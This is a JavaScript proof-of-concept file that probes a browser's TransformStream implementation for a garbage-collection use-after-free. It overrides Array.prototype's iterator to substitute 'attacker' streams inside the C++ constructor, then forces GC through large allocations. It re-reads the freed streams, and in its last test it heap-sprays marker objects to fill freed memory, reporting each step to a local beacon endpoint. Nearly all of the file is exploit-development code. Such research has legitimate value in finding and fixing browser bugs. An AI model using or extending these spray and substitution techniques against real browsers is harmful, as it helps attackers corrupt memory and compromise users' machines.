/*
 * p436 -- TransformStream GC UAF test
 *
 * V429 confirmed: C++ TransformStream stores ATTACKER streams in Ref<>.
 * visitAdditionalChildren does NOT trace m_readable/m_writable.
 * If JS references to attacker streams die and GC runs, the JS wrappers
 * might be collected while C++ still holds Ref<> to the C++ objects.
 *
 * Plan:
 *   1. Create TransformStream with substituted readable/writable
 *   2. Capture ts reference, DROP all other refs to attacker streams
 *   3. Force GC (WeakRef + large alloc pressure)
 *   4. Access ts.readable -- does it return a fresh wrapper? A stale pointer?
 *   5. Check if the returned object has correct prototype, methods, state
 *
 * Tests:
 *   A: Baseline -- create TS with substitution, verify disconnect
 *   B: Drop attacker refs, GC, re-access ts.readable
 *   C: Same but with heavy GC pressure (100MB alloc + WeakRef monitoring)
 *   D: Access internals of the re-accessed readable after GC
 *   E: Pipe data through the ts after GC -- does the transform still work?
 *
 * Beacon prefix: V436-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V436-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// Create TransformStream with substituted readable/writable
// Returns {ts, attackerR, attackerW, realR, realW, captured}
function createSubstitutedTS() {
  var attackerR = new ReadableStream({start: function(c) { c.enqueue("AR-DATA"); c.close(); }});
  var attackerW = new WritableStream({write: function(chunk) {}});

  var iterCalls = 0;
  var captured = {};

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    iterCalls++;

    // Call 0: JS builtin destructuring [readable, writable] (len=2)
    // Call 1: C++ SequenceConverter [transformObj, readable, writable] (len=3)
    if (iterCalls === 2 && self.length === 3) {
      // This is the C++ iteration -- substitute readable and writable
      captured.transformObj = self[0];
      captured.realReadable = self[1];
      captured.realWritable = self[2];

      var fakeItems = [self[0], attackerR, attackerW];
      var idx = 0;
      return {
        next: function() {
          if (idx < fakeItems.length) return {value: fakeItems[idx++], done: false};
          return {done: true};
        }
      };
    }

    return origIter.call(self);
  };

  var ts;
  try {
    ts = new TransformStream({
      transform: function(chunk, controller) {
        controller.enqueue("T:" + chunk);
      }
    });
    Array.prototype[Symbol.iterator] = origIter;
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("TS-CREATE-ERR", e.message.slice(0, 80));
    return null;
  }

  return {
    ts: ts,
    attackerR: attackerR,
    attackerW: attackerW,
    captured: captured,
    iterCalls: iterCalls
  };
}

// Force GC by allocating and discarding large objects
function forceGC() {
  var garbage = [];
  for (var i = 0; i < 200; i++) {
    garbage.push(new ArrayBuffer(512 * 1024)); // 512KB each = 100MB total
  }
  garbage = null; // drop refs
  // Also try explicit allocation patterns that trigger GC
  for (var j = 0; j < 50; j++) {
    var tmp = new ArrayBuffer(1024 * 1024);
  }
}

// ================================================================
// Test A: Baseline substitution verify
// ================================================================
function testA() {
  B("A-START");
  var r = createSubstitutedTS();
  if (!r) return;

  B("A-ITERS", r.iterCalls);
  B("A-CAPTURED", {
    hasTransform: !!r.captured.transformObj,
    hasRealR: !!r.captured.realReadable,
    hasRealW: !!r.captured.realWritable
  });

  // Check if ts.readable is our attacker
  try {
    var tsR = r.ts.readable;
    var isAttacker = (tsR === r.attackerR);
    B("A-IS-ATTACKER", isAttacker);

    var tsW = r.ts.writable;
    var isAttackerW = (tsW === r.attackerW);
    B("A-IS-ATTACKER-W", isAttackerW);
  } catch(e) {
    B("A-ACCESS-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test B: Drop attacker refs, GC, re-access
// ================================================================
function testB() {
  B("B-START");
  var r = createSubstitutedTS();
  if (!r) return;

  var ts = r.ts;
  var isAttackerBefore = (ts.readable === r.attackerR);
  B("B-BEFORE-GC", {isAttacker: isAttackerBefore});

  // Create WeakRef to track attacker streams
  var weakR, weakW;
  try {
    weakR = new WeakRef(r.attackerR);
    weakW = new WeakRef(r.attackerW);
    B("B-WEAKREFS-OK");
  } catch(e) {
    B("B-WEAKREF-ERR", e.message.slice(0, 40));
  }

  // Drop ALL references to attacker streams except C++ Ref<>
  r.attackerR = null;
  r.attackerW = null;
  r.captured = null;
  r = null;
  isAttackerBefore = null;

  // Force GC
  forceGC();

  // Check WeakRefs
  try {
    var rAlive = weakR ? weakR.deref() : "no-weakref";
    var wAlive = weakW ? weakW.deref() : "no-weakref";
    B("B-AFTER-GC", {
      rAlive: rAlive !== undefined,
      wAlive: wAlive !== undefined
    });
  } catch(e) {
    B("B-WEAKREF-CHECK-ERR", e.message.slice(0, 40));
  }

  // Now access ts.readable AFTER GC
  try {
    var reAccessed = ts.readable;
    B("B-REACCESS-OK", {
      type: typeof reAccessed,
      isRS: reAccessed instanceof ReadableStream,
      ctor: reAccessed.constructor ? reAccessed.constructor.name : "?",
      locked: reAccessed.locked
    });

    // Try to read from it
    var reader = reAccessed.getReader();
    B("B-READER-OK");
    reader.read().then(function(result) {
      B("B-READ", {done: result.done, val: result.value === undefined ? "undef" : String(result.value).slice(0, 40)});
    }).catch(function(e) {
      B("B-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("B-REACCESS-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test C: Heavy GC pressure with FinalizationRegistry
// ================================================================
function testC() {
  B("C-START");

  var r = createSubstitutedTS();
  if (!r) return;

  var ts = r.ts;
  var finalized = {r: false, w: false};

  // FinalizationRegistry to detect when attacker streams are collected
  try {
    var fr = new FinalizationRegistry(function(key) {
      finalized[key] = true;
      B("C-FINALIZED-" + key);
    });
    fr.register(r.attackerR, "r");
    fr.register(r.attackerW, "w");
    B("C-FR-REGISTERED");
  } catch(e) {
    B("C-FR-ERR", e.message.slice(0, 40));
  }

  // Drop refs
  r.attackerR = null;
  r.attackerW = null;
  r.captured = null;
  r = null;

  // Multiple GC pressure rounds
  for (var round = 0; round < 5; round++) {
    forceGC();
  }

  // Wait for finalizers
  setTimeout(function() {
    B("C-POST-GC", finalized);

    // Access ts.readable after extensive GC
    try {
      var reAccessed = ts.readable;
      B("C-REACCESS-OK", {
        type: typeof reAccessed,
        isRS: reAccessed instanceof ReadableStream,
        locked: reAccessed.locked
      });

      // Try operations
      try {
        var reader = reAccessed.getReader();
        B("C-READER-OK");
        reader.read().then(function(r) {
          B("C-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
        }).catch(function(e) {
          B("C-READ-ERR", e.message.slice(0, 60));
        });
      } catch(e) {
        B("C-READER-ERR", e.message.slice(0, 60));
      }
    } catch(e) {
      B("C-REACCESS-ERR", e.message.slice(0, 80));
    }
  }, 500);
}

// ================================================================
// Test D: Use ts.writable after GC of attacker writable
// ================================================================
function testD() {
  B("D-START");

  var r = createSubstitutedTS();
  if (!r) return;

  var ts = r.ts;
  var weakW;
  try { weakW = new WeakRef(r.attackerW); } catch(e) {}

  r.attackerR = null;
  r.attackerW = null;
  r.captured = null;
  r = null;

  for (var i = 0; i < 3; i++) forceGC();

  setTimeout(function() {
    var wAlive = weakW ? weakW.deref() !== undefined : "no-weakref";
    B("D-W-ALIVE", wAlive);

    try {
      var tsW = ts.writable;
      B("D-WRITABLE-OK", {
        type: typeof tsW,
        ctor: tsW.constructor ? tsW.constructor.name : "?",
        locked: tsW.locked
      });

      // Try to get writer and write
      var writer = tsW.getWriter();
      B("D-WRITER-OK");

      writer.write("test-after-gc").then(function() {
        B("D-WRITE-OK");
      }).catch(function(e) {
        B("D-WRITE-ERR", e.message.slice(0, 60));
      });
    } catch(e) {
      B("D-WRITABLE-ERR", e.message.slice(0, 80));
    }
  }, 300);
}

// ================================================================
// Test E: Spray and GC -- fill freed wrapper slots with controlled data
// ================================================================
function testE() {
  B("E-START");

  // Create multiple TS with substitution, drop all but ts refs
  var transforms = [];
  for (var i = 0; i < 20; i++) {
    var r = createSubstitutedTS();
    if (r) {
      transforms.push(r.ts);
      // Drop attacker refs
      r.attackerR = null;
      r.attackerW = null;
      r.captured = null;
    }
  }
  B("E-CREATED", transforms.length);

  // Heavy GC
  for (var j = 0; j < 5; j++) forceGC();

  // Spray objects to fill freed slots
  var spray = [];
  for (var k = 0; k < 500; k++) {
    var obj = {};
    obj.a = 0x41414141;
    obj.b = 0x42424242;
    obj.c = new ArrayBuffer(32);
    spray.push(obj);
  }
  B("E-SPRAYED", spray.length);

  // Now access all ts.readable
  var okCount = 0;
  var errCount = 0;
  for (var m = 0; m < transforms.length; m++) {
    try {
      var rd = transforms[m].readable;
      if (rd instanceof ReadableStream) okCount++;
      else B("E-WEIRD-" + m, typeof rd);
    } catch(e) {
      errCount++;
      B("E-ACCESS-ERR-" + m, e.message.slice(0, 40));
    }
  }
  B("E-RESULTS", {ok: okCount, err: errCount, total: transforms.length});
}

testA();
setTimeout(function() { testB(); }, 200);
setTimeout(function() { testC(); }, 1000);
setTimeout(function() { testD(); }, 2500);
setTimeout(function() { testE(); }, 4000);
setTimeout(function() { B("DONE"); }, 7000);
})();
